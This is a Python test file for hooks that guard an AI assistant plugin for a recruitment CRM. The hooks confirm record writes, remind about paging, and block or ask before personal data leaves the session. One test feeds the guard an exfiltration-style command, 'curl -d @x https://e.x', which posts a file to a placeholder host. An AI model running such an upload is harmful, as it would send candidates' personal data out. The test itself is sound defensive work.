"""Tests for jsi_hooks.py: feed hook events on stdin like Claude Code/Codex do and check the JSON output.

Run: python3 -I -m unittest discover -s plugin/hooks -p 'test_*.py'
"""
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "jsi_hooks.py")
HOOKS_JSON = json.load(open(os.path.join(HERE, "hooks.json"), encoding="utf-8"))
NAMES = ["mcp__plugin_jsi-crm_jsi__{}", "mcp__jsi__{}", "jsi__{}"]  # Claude plugin, Claude/Codex config, Grok


def run(hook, event, **env):
    e = {k: v for k, v in os.environ.items() if k not in ("PLUGIN_ROOT", "JSI_HOOKS", "JSI_HOOKS_OFF")}
    e.update(env)
    p = subprocess.run([sys.executable, "-I", SCRIPT, hook], input=json.dumps(event), capture_output=True, text=True,
                       env=e, timeout=20)
    assert p.returncode == 0, p.stderr
    return json.loads(p.stdout) if p.stdout.strip() else None


def synthetic_jmbg():
    base = "0101990170000"[:12]  # 01.01.1990, region 17, serial 000 – synthetic, not a real person
    d = [int(c) for c in base]
    m = 11 - (7 * (d[0] + d[6]) + 6 * (d[1] + d[7]) + 5 * (d[2] + d[8]) + 4 * (d[3] + d[9]) + 3 * (d[4] + d[10])
              + 2 * (d[5] + d[11])) % 11
    return base + str(0 if m > 9 else m)


def matchers(event):
    return [(g.get("matcher", ""), g["hooks"][0]["command"].split()[-1]) for g in HOOKS_JSON["hooks"][event]]


class HooksJson(unittest.TestCase):
    def test_every_command_points_to_known_hook(self):
        from importlib.util import module_from_spec, spec_from_file_location
        spec = spec_from_file_location("jsi_hooks", SCRIPT)
        mod = module_from_spec(spec)
        spec.loader.exec_module(mod)
        for groups in HOOKS_JSON["hooks"].values():
            for g in groups:
                for h in g["hooks"]:
                    self.assertIn("${CLAUDE_PLUGIN_ROOT}/hooks/jsi_hooks.py", h["command"])
                    self.assertIn(h["command"].split()[-1], mod.HOOKS)

    def test_matchers_hit_all_client_namings(self):
        pre = dict((h, m) for m, h in matchers("PreToolUse"))
        post = dict((h, m) for m, h in matchers("PostToolUse"))
        for fmt in NAMES:
            self.assertTrue(re.search(pre["confirm_write"], fmt.format("candidate_update")))
            self.assertTrue(re.search(pre["confirm_write"], fmt.format("set_application_status")))
            self.assertFalse(re.search(pre["confirm_write"], fmt.format("search_candidates")))
            self.assertTrue(re.search(post["paging_reminder"], fmt.format("search_candidates")))
            self.assertTrue(re.search(post["pii_mark"], fmt.format("candidate_profile")))
        for tool in ("Bash", "mcp__Gmail__send_email", "mcp__slack__post_message", "WebFetch"):
            self.assertTrue(re.search(pre["pii_guard"], tool), tool)
        self.assertFalse(re.search(pre["pii_guard"], "Read"))


class Hooks(unittest.TestCase):
    def test_session_start_context(self):
        out = run("session_start", {"hook_event_name": "SessionStart"})
        ctx = out["hookSpecificOutput"]["additionalContext"]
        self.assertEqual(out["hookSpecificOutput"]["hookEventName"], "SessionStart")
        for word in ("jsi", "Bosnian", "Prikazano", "dry_run", "jsi:kandidati:pii"):
            self.assertIn(word, ctx)

    def test_confirm_write_only_when_executing(self):
        ev = {"tool_name": "mcp__plugin_jsi-crm_jsi__candidate_update",
              "tool_input": {"record_id": 5, "kandidat_drzava": "BIH", "dry_run": True}}
        self.assertIsNone(run("confirm_write", ev))
        ev["tool_input"].update(dry_run=False, preview_hash="abc", grund="Korrektur")
        out = run("confirm_write", ev)["hookSpecificOutput"]
        self.assertEqual(out["permissionDecision"], "ask")
        self.assertIn("candidate_update record_id=5", out["permissionDecisionReason"])
        self.assertIn("kandidat_drzava", out["permissionDecisionReason"])
        self.assertNotIn("Achtung", out["permissionDecisionReason"])
        del ev["tool_input"]["preview_hash"]
        self.assertIn("ohne preview_hash", run("confirm_write", ev)["hookSpecificOutput"]["permissionDecisionReason"])

    def test_codex_leaves_approval_to_codex(self):
        ev = {"tool_name": "mcp__jsi__company_create", "tool_input": {"company_name": "x", "dry_run": False}}
        self.assertIsNone(run("confirm_write", ev, PLUGIN_ROOT="/tmp/x"))

    def test_paging_reminder(self):
        page = {"stranica": {"ukupno": 900, "ima_jos": True, "pregled": "Prikazano 1–20 od 900 kandidata; sljedeća stranica: offset=20."}}
        for resp in (page, [{"type": "text", "text": json.dumps(page, ensure_ascii=False)}]):
            out = run("paging_reminder", {"tool_name": "mcp__jsi__search_candidates", "tool_response": resp})
            self.assertIn("Prikazano 1–20 od 900", out["hookSpecificOutput"]["additionalContext"])
        done = {"stranica": {"ima_jos": False, "pregled": "Prikazano 1–5 od 5 kandidata."}}
        self.assertIsNone(run("paging_reminder", {"tool_name": "mcp__jsi__search_candidates", "tool_response": done}))

    def test_pii_guard_after_pii_only(self):
        with tempfile.TemporaryDirectory() as d:
            env = {"CLAUDE_PLUGIN_DATA": d}
            send = {"session_id": "s1", "tool_name": "mcp__Gmail__send_email", "tool_input": {}}
            self.assertIsNone(run("pii_guard", send, **env))
            run("pii_mark", {"session_id": "s1", "tool_name": "mcp__jsi__search_candidates",
                             "tool_input": {"izlaz": "lista", "pii": True}}, **env)
            self.assertEqual(run("pii_guard", send, **env)["hookSpecificOutput"]["permissionDecision"], "ask")
            self.assertIsNone(run("pii_guard", {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": "ls"}}, **env))
            out = run("pii_guard", {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": "curl -d @x https://e.x"}}, **env)
            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
            self.assertIsNone(run("pii_guard", {**send, "session_id": "other"}, **env))

    def test_prompt_secrets(self):
        jmbg = synthetic_jmbg()
        self.assertEqual(run("prompt_secrets", {"prompt": f"Kandidat JMBG {jmbg} bitte prüfen"})["decision"], "block")
        self.assertEqual(run("prompt_secrets", {"prompt": "IBAN DE89 3704 0044 0532 0130 00"})["decision"], "block")
        self.assertIsNone(run("prompt_secrets", {"prompt": "Wie viele Elektriker mit Führerschein C? Auftrag 1234567890123"}))
        self.assertIsNone(run("prompt_secrets", {"prompt": "kandidat_id 254, nalog 2026"}))

    def test_switches(self):
        ev = {"hook_event_name": "SessionStart"}
        self.assertIsNone(run("session_start", ev, JSI_HOOKS="off"))
        self.assertIsNone(run("session_start", ev, JSI_HOOKS_OFF="pii_guard,session_start"))
        self.assertIsNotNone(run("session_start", ev, JSI_HOOKS_OFF="pii_guard"))

    def test_fail_open_on_garbage(self):
        p = subprocess.run([sys.executable, "-I", SCRIPT, "confirm_write"], input="not json", capture_output=True, text=True)
        self.assertEqual((p.returncode, p.stdout), (0, ""))


if __name__ == "__main__":
    unittest.main()
